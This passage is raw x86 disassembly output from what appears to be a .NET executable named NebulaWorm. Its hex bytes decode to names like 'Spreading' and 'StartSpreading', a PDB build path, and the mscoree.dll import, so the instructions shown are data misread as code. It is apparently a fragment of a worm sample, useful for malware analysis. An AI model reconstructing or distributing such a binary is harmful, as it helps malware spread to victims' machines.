  408682:	6c                   	insb   (%dx),%es:(%edi)
  408683:	6f                   	outsl  %ds:(%esi),(%dx)
  408684:	77 57                	ja     0x4086dd
  408686:	69 2b 3c 3e 63 2b    	imul   $0x2b633e3c,(%ebx),%ebp
  40868c:	3c 3c                	cmp    $0x3c,%al
  40868e:	53                   	push   %ebx
  40868f:	74 61                	je     0x4086f2
  408691:	72 74                	jb     0x408707
  408693:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  408697:	33 5f 30             	xor    0x30(%edi),%ebx
  40869a:	3e 64 00 00          	ds add %al,%fs:(%eax)
  40869e:	37                   	aaa
  40869f:	01 00                	add    %eax,(%eax)
  4086a1:	32 4e 65             	xor    0x65(%esi),%cl
  4086a4:	62 75 6c             	bound  %esi,0x6c(%ebp)
  4086a7:	61                   	popa
  4086a8:	57                   	push   %edi
  4086a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4086aa:	72 6d                	jb     0x408719
  4086ac:	2e 53                	cs push %ebx
  4086ae:	70 72                	jo     0x408722
  4086b0:	65 61                	gs popa
  4086b2:	64 69 6e 67 2b 3c 3e 	imul   $0x633e3c2b,%fs:0x67(%esi),%ebp
  4086b9:	63 
  4086ba:	2b 3c 3c             	sub    (%esp,%edi,1),%edi
  4086bd:	53                   	push   %ebx
  4086be:	74 61                	je     0x408721
  4086c0:	72 74                	jb     0x408736
  4086c2:	53                   	push   %ebx
  4086c3:	70 72                	jo     0x408737
  4086c5:	65 61                	gs popa
  4086c7:	64 69 6e 67 3e 62 5f 	imul   $0x5f5f623e,%fs:0x67(%esi),%ebp
  4086ce:	5f 
  4086cf:	34 5f                	xor    $0x5f,%al
  4086d1:	30 3e                	xor    %bh,(%esi)
  4086d3:	64 00 00             	add    %al,%fs:(%eax)
  4086d6:	00 00                	add    %al,(%eax)
  4086d8:	00 00                	add    %al,(%eax)
  4086da:	00 00                	add    %al,(%eax)
  4086dc:	24 87                	and    $0x87,%al
  4086de:	2e f3 00 00          	repz add %al,%cs:(%eax)
  4086e2:	00 00                	add    %al,(%eax)
  4086e4:	02 00                	add    (%eax),%al
  4086e6:	00 00                	add    %al,(%eax)
  4086e8:	60                   	pusha
  4086e9:	00 00                	add    %al,(%eax)
  4086eb:	00 10                	add    %dl,(%eax)
  4086ed:	87 00                	xchg   %eax,(%eax)
  4086ef:	00 10                	add    %dl,(%eax)
  4086f1:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
	...
  4086ff:	00 10                	add    %dl,(%eax)
	...
  40870d:	00 00                	add    %al,(%eax)
  40870f:	00 52 53             	add    %dl,0x53(%edx)
  408712:	44                   	inc    %esp
  408713:	53                   	push   %ebx
  408714:	90                   	nop
  408715:	1c a2                	sbb    $0xa2,%al
  408717:	7b 65                	jnp    0x40877e
  408719:	f9                   	stc
  40871a:	c5 47 b8             	lds    -0x48(%edi),%eax
  40871d:	75 37                	jne    0x408756
  40871f:	41                   	inc    %ecx
  408720:	1a 94 ab f1 01 00 00 	sbb    0x1f1(%ebx,%ebp,4),%dl
  408727:	00 43 3a             	add    %al,0x3a(%ebx)
  40872a:	5c                   	pop    %esp
  40872b:	55                   	push   %ebp
  40872c:	73 65                	jae    0x408793
  40872e:	72 73                	jb     0x4087a3
  408730:	5c                   	pop    %esp
  408731:	49                   	dec    %ecx
  408732:	7a 6f                	jp     0x4087a3
  408734:	6c                   	insb   (%dx),%es:(%edi)
  408735:	79 5c                	jns    0x408793
  408737:	44                   	inc    %esp
  408738:	65 73 6b             	gs jae 0x4087a6
  40873b:	74 6f                	je     0x4087ac
  40873d:	70 5c                	jo     0x40879b
  40873f:	4e                   	dec    %esi
  408740:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  408744:	61                   	popa
  408745:	57                   	push   %edi
  408746:	6f                   	outsl  %ds:(%esi),(%dx)
  408747:	72 6d                	jb     0x4087b6
  408749:	5c                   	pop    %esp
  40874a:	4e                   	dec    %esi
  40874b:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40874f:	61                   	popa
  408750:	57                   	push   %edi
  408751:	6f                   	outsl  %ds:(%esi),(%dx)
  408752:	72 6d                	jb     0x4087c1
  408754:	5c                   	pop    %esp
  408755:	6f                   	outsl  %ds:(%esi),(%dx)
  408756:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  408759:	52                   	push   %edx
  40875a:	65 6c                	gs insb (%dx),%es:(%edi)
  40875c:	65 61                	gs popa
  40875e:	73 65                	jae    0x4087c5
  408760:	5c                   	pop    %esp
  408761:	4e                   	dec    %esi
  408762:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  408766:	61                   	popa
  408767:	57                   	push   %edi
  408768:	6f                   	outsl  %ds:(%esi),(%dx)
  408769:	72 6d                	jb     0x4087d8
  40876b:	2e 70 64             	jo,pn  0x4087d2
  40876e:	62 00                	bound  %eax,(%eax)
  408770:	98                   	cwtl
  408771:	87 00                	xchg   %eax,(%eax)
	...
  40877b:	00 b2 87 00 00 00    	add    %dh,0x87(%edx)
  408781:	20 00                	and    %al,(%eax)
	...
  408797:	00 a4 87 00 00 00 00 	add    %ah,0x0(%edi,%eax,4)
	...
  4087a6:	5f                   	pop    %edi
  4087a7:	43                   	inc    %ebx
  4087a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a9:	72 45                	jb     0x4087f0
  4087ab:	78 65                	js     0x408812
  4087ad:	4d                   	dec    %ebp
  4087ae:	61                   	popa
  4087af:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  4087b6:	72 65                	jb     0x40881d
  4087b8:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  4087bc:	6c                   	insb   (%dx),%es:(%edi)
  4087bd:	00 00                	add    %al,(%eax)
  4087bf:	00 00                	add    %al,(%eax)
  4087c1:	00 ff                	add    %bh,%bh
  4087c3:	25 00 20 40 00       	and    $0x402000,%eax
